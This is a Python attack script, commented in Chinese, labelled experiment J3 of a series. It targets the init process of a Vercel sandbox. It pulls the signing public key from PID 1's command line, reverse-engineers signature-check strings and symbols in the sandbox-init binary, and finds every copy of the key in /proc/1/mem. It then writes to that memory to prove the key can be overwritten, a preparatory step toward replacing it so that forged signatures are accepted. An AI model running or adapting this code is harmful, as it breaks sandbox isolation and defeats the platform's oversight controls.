# 实验J3: 二进制签名格式逆向 + pubkey 内存副本定位 + 可写性验证(无损)
# J2 证实: pubkey 明文在 rw 段 @0x35e8f97c2390, /proc/1/mem 属主=vercel-sandbox(rw)
# 目标: ① 找 signature 头名与消息格式(二进制逆向)
#       ② 定位 pubkey 全部内存副本
#       ③ 验证 pubkey 所在页可写(写回原值)
import os, re, subprocess, base64

def run(cmd, timeout=20):
    try:
        r = subprocess.run(["bash", "-c", cmd], capture_output=True, timeout=timeout)
        return (r.stdout + r.stderr).decode(errors='replace')
    except Exception as e:
        return f"ERR {type(e).__name__}: {e}"

BIN = "/run/vercel/share/sandbox-init"
cmdline = run("cat /proc/1/cmdline | tr '\\0' ' '")
m = re.search(r"--pubkey=([A-Za-z0-9+/=]+)", cmdline)
pubkey_b64 = m.group(1) if m else ""
pubkey = base64.b64decode(pubkey_b64) if pubkey_b64 else b""
print(f"pubkey: {pubkey_b64} ({len(pubkey)}B)", flush=True)

print("== [1] 二进制 signature 相关字符串 ==", flush=True)
try:
    data = open(BIN, "rb").read()
    print(f"  二进制大小: {len(data)}", flush=True)
    pats = [b"signature", b"Signature", b"SIGNATURE", b"missing signature",
            b"ed25519", b"pubkey", b"verify", b"x-vercel", b"vercel-sandbox"]
    for pat in pats:
        idxs = [m.start() for m in re.finditer(re.escape(pat), data)]
        if idxs:
            print(f"  '{pat.decode()}' x{len(idxs)}:", flush=True)
            for i in idxs[:6]:
                ctx = data[max(0, i-60):i+90]
                s = re.sub(rb'[^\x20-\x7e]', b'.', ctx).decode(errors='replace')
                print(f"    @0x{i:x}: ...{s}...", flush=True)
except Exception as e:
    print(f"  二进制读取失败: {e}", flush=True)

print("== [2] pubkey 全内存副本定位(所有可读段) ==", flush=True)
maps_txt = open("/proc/1/maps").read()
copies = []
for line in maps_txt.splitlines():
    parts = line.split()
    if len(parts) < 2 or parts[1][0] != "r":
        continue
    try:
        a0, a1 = parts[0].split("-")
        start, end = int(a0, 16), int(a1, 16)
    except Exception:
        continue
    try:
        fd = os.open("/proc/1/mem", os.O_RDONLY)
        size = min(end - start, 16 * 1024 * 1024)
        d = os.pread(fd, size, start)
        os.close(fd)
    except Exception:
        continue
    idx = 0
    while True:
        i = d.find(pubkey, idx)
        if i < 0:
            break
        copies.append((start + i, parts[1], parts[4] if len(parts) > 5 else ""))
        idx = i + 1
for off, perm, pth in copies:
    print(f"  @0x{off:x} [{perm}] {pth}", flush=True)

print("== [3] pubkey 页可写性验证(写回原值, 无损) ==", flush=True)
if copies:
    off, perm, pth = copies[0]
    if "w" in perm:
        fd = os.open("/proc/1/mem", os.O_RDWR)
        orig = os.pread(fd, 32, off)
        os.pwrite(fd, orig, off)  # 写回原值
        back = os.pread(fd, 32, off)
        os.close(fd)
        print(f"  写回验证: orig==back: {orig == back}, 可写确认!", flush=True)
    else:
        print(f"  段 {perm} 不可写, 需 mprotect 或换副本", flush=True)
    if len(copies) > 1:
        print(f"  注意: 共 {len(copies)} 个副本, 需全部替换才生效", flush=True)
else:
    print("  未找到 pubkey 副本?!", flush=True)

print("== [4] 签名验证相关 Go 符号(二进制 symbol 表) ==", flush=True)
print(run("go tool nm " + BIN + " 2>/dev/null | grep -iE 'sign|ed25519|verify' | head -20 || echo 'go tool 不可用'"), flush=True)
print(run("readelf -S " + BIN + " 2>/dev/null | grep -iE 'symtab|dynsym' | head -5 || echo 'readelf 不可用'"), flush=True)
print("done", flush=True)
